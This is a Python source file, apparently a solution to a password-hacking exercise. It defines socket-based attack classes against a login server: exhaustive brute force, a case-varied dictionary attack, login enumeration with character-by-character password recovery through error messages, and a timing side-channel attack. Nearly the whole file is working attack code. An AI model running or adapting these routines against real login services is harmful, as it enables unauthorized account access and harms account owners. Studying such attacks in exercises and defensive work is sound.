import itertools
import json
import string
import time

alphabet = string.ascii_letters + string.digits + string.punctuation + " "


def generator_password():
    i = 1
    while True:
        for password in itertools.product(alphabet, repeat=i):
            yield "".join(password)
        i += 1


def fill_dict(some_dict: dict, login, password):
    some_dict["login"] = login
    some_dict["password"] = password


def find_login(new_dict: dict, client_socket, password=" "):
    generator_login = generate_sequence_case_sensitive("logins.txt")
    for login in generator_login:
        fill_dict(new_dict, login, password)
        json_output = json.dumps(new_dict)
        client_socket.send(json_output.encode("utf8"))
        message = \
            json.loads(client_socket.recv(1024).decode("utf8"))[
                "result"]
        if message == "Wrong password!":
            return login


def generate_sequence_case_sensitive(filename: str):
    with open(filename, "rt", encoding="UTF-8") as file:
        for sequence in file:
            sequence = sequence.strip()
            char_comb_sequence = list()
            for char in sequence:
                if char.isalpha():
                    char_comb_sequence.append((char.lower(), char.upper()))
                else:
                    char_comb_sequence.append(char)
            for diff_password_tuple in itertools.product(
                    *char_comb_sequence):
                yield "".join(diff_password_tuple)


class SimpleBruteForce:
    def __init__(self, client_socket, ip_address, port):
        self.port = port
        self.ip_address = ip_address
        self.client_socket = client_socket

    def brute_force(self):
        self.client_socket.connect((self.ip_address, self.port))
        for password in generator_password():
            self.client_socket.send(password.encode("utf8"))
            message = self.client_socket.recv(1024).decode("utf8")
            if message == "Connection success!":
                print(password)
                break


class SimpleDictionaryBruteForce:
    def __init__(self, client_socket, ip_address, port):
        self.port = port
        self.ip_address = ip_address
        self.client_socket = client_socket

    def brute_force(self):
        self.client_socket.connect((self.ip_address, self.port))
        generator_pass = generate_sequence_case_sensitive("passwords.txt")
        for password in generator_pass:
            try:
                self.client_socket.send(password.encode("utf8"))
                message = self.client_socket.recv(1024).decode("utf8")
                if message == "Connection success!":
                    print(password)
                    break
            except ConnectionAbortedError:
                pass


class JsonLoginAndPasswordBruteForce:
    def __init__(self, client_socket, ip_address, port):
        self.port = port
        self.ip_address = ip_address
        self.client_socket = client_socket

    def brute_force(self):
        self.client_socket.connect((self.ip_address, self.port))
        new_dict = {}
        right_login = find_login(new_dict, client_socket=self.client_socket)
        message = ""
        password = ""
        while message != "Connection success!":
            for char in alphabet:
                password += char
                fill_dict(new_dict, right_login, password)
                json_output = json.dumps(new_dict)
                self.client_socket.send(json_output.encode("utf8"))
                message = \
                    json.loads(
                        self.client_socket.recv(1024).decode("utf8"))[
                        "result"]

                if message == "Exception happened during login":
                    break
                elif message == "Wrong password!":
                    password = password[:-1]
                elif message == "Connection success!":
                    break

        print(json.dumps(new_dict))


class TimeBasedVulnerabilityBruteForce:
    def __init__(self, client_socket, ip_address, port):
        self.port = port
        self.ip_address = ip_address
        self.client_socket = client_socket

    def brute_force(self):
        self.client_socket.connect((self.ip_address, self.port))
        new_dict = {}
        right_login = find_login(new_dict, client_socket=self.client_socket)
        password = ""
        while True:
            for char in alphabet:
                password += char
                fill_dict(new_dict, right_login, password)
                json_output = json.dumps(new_dict)
                start = time.time()
                self.client_socket.send(json_output.encode("utf8"))
                message = \
                    json.loads(
                        self.client_socket.recv(1024).decode("utf8"))[
                        "result"]
                final = time.time()
                if message == "Wrong password!":
                    if (final - start) > 0.05:
                        break
                    else:
                        password = password[:-1]
                elif message == "Connection success!":
                    print(json_output)
                    return
